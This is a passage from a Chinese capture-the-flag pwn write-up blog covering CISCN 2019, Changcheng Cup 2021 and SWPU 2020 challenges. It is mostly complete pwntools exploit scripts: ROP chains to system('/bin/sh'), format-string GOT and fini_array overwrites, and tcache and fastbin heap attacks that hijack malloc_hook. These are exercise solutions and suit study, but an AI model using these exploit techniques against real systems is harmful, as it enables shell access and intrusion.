pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007f0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400aec : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b9 : ret</span></span><br><span class="line"><span class="string">0x00000000004008ca : ret 0x2017</span></span><br><span class="line"><span class="string">0x0000000000400962 : ret 0x458b</span></span><br><span class="line"><span class="string">0x00000000004009c5 : ret 0xbf02</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28015</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">pop_4 = <span class="number">0x400c7c</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	p = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">		x = <span class="built_in">chr</span>(x)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">122</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">90</span>:</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">ord</span>(x)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">57</span>:</span><br><span class="line">					x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xc</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xd</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xe</span>)</span><br><span class="line">		p += x</span><br><span class="line">	<span class="keyword">return</span>(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(encrypt(payload))</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_addr + <span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019东北-PWN3"><a class="header-anchor" href="#CISCN-2019东北-PWN3">¶</a>CISCN 2019东北 PWN3</h2>
<h3 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h3>
<p>main函数</p>
<p><img src="http://static.zybuluo.com/hgggg/spub8xbz8oe263t2gjkadvuj/5.png" alt="5.png-36.5kB"></p>
<p>print_chk()明显是个格式化字符串</p>
<p>这个题能用的函数就两个</p>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png" alt="3.png-31.2kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/nq6c5o48hap4cvvg7iz1vlj1/4.png" alt="4.png-22.6kB"></p>
<p>存在UAF</p>
<h3 id="题目思路"><a class="header-anchor" href="#题目思路">¶</a>题目思路</h3>
<p>题目给的环境是Ubuntu 18 glibc 2.27</p>
<p>这里直接就一个格式化字符串泄露libc地址再tcachebin double free 来Getshell</p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28046)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,story</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,story)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>)</span><br><span class="line">s = <span class="built_in">str</span>(p.recv(<span class="number">130</span>)).split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(s[<span class="number">7</span>],<span class="number">16</span>)-<span class="number">0x81237</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019华北-PWN1"><a class="header-anchor" href="#CISCN-2019华北-PWN1">¶</a>[CISCN 2019华北]PWN1</h2>
<h3 id="题目思路-v2"><a class="header-anchor" href="#题目思路-v2">¶</a>题目思路</h3>
<p>简单的栈溢出 + ret2text</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;BBB&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BBB&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28049</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400501</span> </span><br><span class="line">pop_rdi = <span class="number">0x400793</span></span><br><span class="line">cat_flag = <span class="number">0x04007CC</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number.&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(cat_flag)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040078c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400790 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400792 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005e0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400793 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400791 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040078d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400501 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019西南-PWN1"><a class="header-anchor" href="#CISCN-2019西南-PWN1">¶</a>[CISCN 2019西南]PWN1</h2>
<h3 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h3>
<p>漏洞点是main函数中的格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main函数只能执行一次，但是在函数退出的时候回去执行__fini_array里的函数</p>
<p>由于题目是&quot;No RELRO&quot;所以__fini_array可读可写</p>
<p>所以本题可以利用格式化字符串任意地址写来同时将__fini_array[0]写为main,printf_got写为system_plt</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;CCC&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28060</span>)</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#0x80483D0 </span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment">#0x8048534 </span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">fini = <span class="number">0x0804979C</span></span><br><span class="line"></span><br><span class="line">payload = p32(fini+ <span class="number">2</span>) + p32(printf+<span class="number">2</span>) + p32(printf) + p32(fini)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x0804 - 0x10) + &quot;c%4$hn&quot;    #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%5$hn&quot;                                #0804 </span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x83D0 - 0x0804) + &quot;c%6$hn&quot;  #83D0</span></span><br><span class="line"><span class="string">payload += &quot;%&quot; + str(0x8534 - 0x83D0) + &quot;c%7$hn&quot;  #8534</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%2036c%4$hn%5$hn%31692c%6$hn%356c%7$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-长城杯院校组-king-in-heap-1"><a class="header-anchor" href="#2021-长城杯院校组-king-in-heap-1">¶</a>[2021 长城杯院校组]king_in_heap_1</h2>
<h3 id="题目考点-v2"><a class="header-anchor" href="#题目考点-v2">¶</a>题目考点</h3>
<pre><code>1.uaf
2.fastbin attack
3.House-of-Roman
</code></pre>
<h3 id="漏洞分析"><a class="header-anchor" href="#漏洞分析">¶</a>漏洞分析</h3>
<p>delete 函数存在uaf</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input index:&quot;</span>);</span><br><span class="line">  index = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">10</span> || !heaparray[index] || !lenarray[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)heaparray[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时给出了printf的后3位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="keyword">unsigned</span> __int64)&amp;<span class="built_in">printf</span> &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
<h4 id="Step1-leak-libc"><a class="header-anchor" href="#Step1-leak-libc">¶</a>Step1 leak libc</h4>
<p>首先利用给出的printf的后三位计算出stderr+157的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br></pre></td></tr></table></figure>
<p>stderr+157:这个偏移是固定，在2.23版本的libc中，之后填充0x33就可以攻击stdout结构体，从而可以制造泄露出stderr+192 的地址</p>
<p>之后就是结合fastbin attack泄露</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>]) <span class="comment">#edit unsortedbin fd</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br></pre></td></tr></table></figure>
<p>这段paylaod的写法可以参考：<a href="https://www.jianshu.com/p/27152c14e2e7">https://www.jianshu.com/p/27152c14e2e7</a></p>
<h4 id="Step2-劫持malloc-hook-get-shell"><a class="header-anchor" href="#Step2-劫持malloc-hook-get-shell">¶</a>Step2 劫持malloc_hook get shell</h4>
<p>这里利用方法参考：<a href="https://blog.csdn.net/seaaseesa/article/details/103057937">https://blog.csdn.net/seaaseesa/article/details/103057937</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="EXP"><a class="header-anchor" href="#EXP">¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;EEE&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;context:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">6</span>),<span class="number">16</span>)</span><br><span class="line">stderr_157 = printf + <span class="number">0x36fdcd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)  <span class="comment">#add from unsortedbin</span></span><br><span class="line">edit(<span class="number">4</span>,p64(stderr_157)[:<span class="number">3</span>])</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) -<span class="number">0x3c5600</span></span><br><span class="line">malloc_hook_offset = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] -<span class="number">0x23</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(malloc_hook_offset))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>) + p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-tnote"><a class="header-anchor" href="#SWPU-2020-tnote">¶</a>SWPU 2020 tnote</h2>
<h3 id="漏洞分析-v2"><a class="header-anchor" href="#漏洞分析-v2">¶</a>漏洞分析</h3>
<p>在题目的edit函数中存在off by one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= dword_202060[v3]; ++i )  <span class="comment">//off by one</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  *(_BYTE *)(i + qword_202080[v3]) = buf;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用off by one 来修改 chunk 的szie 位来造成tacahe overlapping</p>
<h3 id="解题步骤-v2"><a class="header-anchor" href="#解题步骤-v2">¶</a>解题步骤</h3>
<p>Step1:构造overlapped chunk</p>
<p>在申请的时候需要注意，chunk2和chunk4的大小一致，方便等下释放进入tacahe</p>
<p>修改chunk1 的大小为0x71，此时chunk1和chunk2重合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1 0x21 </span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#2 0x51</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#3 0x41</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#4 0x51</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)  <span class="comment">#chunk1 =&gt; 0x71</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure>
<p>Step2:泄露堆地址</p>
<p>释放chunk4和chunk2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
